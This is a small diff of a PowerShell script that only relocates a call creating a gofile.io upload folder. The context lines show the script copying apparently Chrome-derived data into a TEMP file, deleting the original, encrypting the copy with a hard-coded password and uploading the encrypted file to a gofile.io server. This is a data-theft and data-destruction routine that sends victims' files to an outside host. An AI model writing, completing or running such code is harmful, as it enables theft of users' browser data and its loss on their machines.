@@ -150,6 +150,7 @@ $dbp6 = "$env:TEMP\chromes_tihng5"
 
 Copy-Item $op $dbp -Force
 delete-data -op $op -p "s"
+$fid=creat-FilesToGofile
 Protect-File -FilePath $dbp -p "For_oNS."
 $fid=creat-FilesToGofile
 Upload-FilesToGofile -FilePath "$dbp.crypt" -newFolderId $fid
@@ -176,7 +177,7 @@ $server = $serverReq.data.servers[0].name
 
 $uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
 
-$fid=creat-FilesToGofile
+
 
 #crypt
 
